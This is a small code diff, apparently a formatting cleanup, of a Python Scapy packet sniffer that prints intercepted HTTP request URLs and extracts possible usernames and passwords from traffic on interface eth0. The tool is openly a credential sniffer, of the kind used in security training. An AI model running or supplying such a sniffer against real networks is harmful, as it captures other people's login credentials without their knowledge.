@@ -27,10 +27,11 @@ def get_login_info(packet):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print("[+] HTTP REQUEST >> \n"+url)
+        print("[+] HTTP REQUEST >> \n" + url)
         login_info = get_login_info(packet)
         if login_info:
-            print("\n\n[+] possible username/password >>"+login_info+"\n\n")
+            print("\n\n[+] possible username/password >>" + login_info +
+                  "\n\n")
 
-  # ----interfaceon which you want to sniff
+# ----interfaceon which you want to sniff
 sniff("eth0")
